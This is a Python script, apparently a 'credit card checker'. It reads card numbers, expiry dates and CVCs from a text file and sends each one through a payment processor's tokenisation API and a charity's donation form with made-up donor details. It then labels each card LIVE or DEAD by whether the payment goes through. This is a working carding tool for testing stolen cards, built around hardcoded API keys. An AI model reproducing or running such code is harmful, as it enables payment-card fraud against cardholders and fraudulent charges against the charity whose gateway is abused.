from bs4 import BeautifulSoup
from colorama import Fore, init
import json
import requests
import time


init()


class Checker():
    def __init__(self):
        self.range = []
        
        print("""
        {re}             {g}_____________{re}
        {re}------------{g}[ {r}CODECHECKER {g}]{re}------------
        {re}------------{g}|- {r}GATEWAY 2 -{g}|{re}------------
        {re}---------------------------------------
        """.format(g=Fore.GREEN, r=Fore.RED, re=Fore.RESET))
        with open('cc.txt', 'r') as f:
            for x in f.read().split('\n'):
                self.range.append(x)

        print(Fore.YELLOW + "[*]" + Fore.RESET + " Checking " + str(len(self.range)) + ' Credit Card(s)')
        input('[PRESS ANY KEY TO CONTINUE]')
        print(Fore.GREEN + "[+]" + Fore.RESET + ' Check start at ' + str(time.ctime()))
        print()
        self.checker()

    def check(self, credit_card, ccentry):
        ccentry = str(ccentry)
        ccNumber, ccMonth, ccYear, ccCode = credit_card.split('|')
        session = requests.Session()
        firstSource = session.get("https://www.brb.org.uk/package/donation").text

        secondData = {
            "reusable":False,
            "paymentMethod":{
                "type":"Card",
                "name":"asian pro",
                "expiryMonth":ccMonth,
                "expiryYear":ccYear,
                "cardNumber":ccNumber,
                "cvc":ccCode,
                },
            "clientKey":"L_C_ad19e367-c1b8-4699-a1ea-c969721b68ad"
            }

        secondHeader = {
            'Content-type': 'application/json',
            'Origin': 'https://online.worldpay.com',
            'Referer': 'https://online.worldpay.com/templates/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
        }

        secondSource = json.loads(session.post('https://api.worldpay.com/v1/tokens', json=secondData, headers=secondHeader).text)
        session.options('https://api.worldpay.com/v1/tokens')

        thirdData = {
            'packageName': 'Donate',
            'packageId': '4664',
            'packageValue': 'other',
            'packageValue': '500',
            'title': 'mr',
            'firstName': 'asian',
            'surname': 'pro',
            'address1': 'asiant',
            'address2': 'pro',
            'cityTown': 'illion',
            'country': 'gb',
            'postcode': 'GL51 0EX',
            'email': 'asa@anon.ph',
            'emailConfirm': 'asa@anon.ph',
            'telephone': '1231231231',
            'token': 'LIVE_SU_78e0e9d5-979a-4195-96c9-cabc733fa01f'
        }

        thirdHeader = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'www.brb.org.uk',
            'Origin': 'https://www.brb.org.uk',
            'Referer': 'https://www.brb.org.uk/package/donation',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

        thirdResponse = json.loads(session.post('https://www.brb.org.uk/actions/brb/orders/processPackageRequest', data=thirdData, headers=thirdHeader).text)

        if not thirdResponse['success']:
            print('{red}[{ccentry}]  DEAD   ---   {credit_card}\tType: {type}\tState: {status}'.format(red=Fore.RED, ccentry=ccentry, credit_card=credit_card, type=thirdResponse['order']['cardType'], status=thirdResponse['order']['state']))

        else:
            print(thirdResponse)
            print('LIVE\t---\t' + credit_card)

    def checker(self):
        f = open('cc.txt', 'r')
        cc = 0
        for x in f.read().split('\n'):
            cc += 1
            self.check(x, cc)

